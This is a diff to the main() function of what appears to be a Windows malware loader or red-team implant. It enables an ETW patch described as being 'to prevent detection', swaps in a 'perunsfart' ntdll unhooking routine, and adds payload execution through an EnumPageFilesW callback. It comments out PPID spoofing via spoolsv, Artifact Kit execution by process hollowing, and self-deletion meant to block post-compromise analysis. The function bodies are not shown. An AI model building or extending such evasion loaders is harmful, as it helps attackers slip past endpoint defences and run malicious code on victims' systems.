@@ -16,13 +16,16 @@ int main()
 
 
     // Patching the Event Tracing for Windows (ETW) to prevent detection
-    // evt_patch();
+    evt_patch();
+
+
 
     // Create a fresh copy of the ntdll library from file to unhook functions
-    // unhooking();
+    // fresh_unhooking();
+    perunsfart_unhooking();
 
     // Get spoolsv PID for PPID spoofing
-    DWORD pid = GetPID();
+    // DWORD pid = GetPID();
 
 
 
@@ -31,7 +34,9 @@ int main()
 
 
 
-
+    // For payload execution with EnumPageFilesW
+    EnumPageExec();
+     
     // For synchronous payload execution with PPID spoofing through process hollowing
     //Indirect_RawExec_ppid(pid);
 
@@ -42,10 +47,10 @@ int main()
     // IndirectRemoteAPC(pid);
 
     // For Artifact kit execution with PPID spoofing through process hollowing
-    execArtifact(pid);
+    // execArtifact(pid);
 
 
 
     // For self-deletion to prevent post-compromise analysis
-    DeleteSelf();
+    // DeleteSelf();
 }
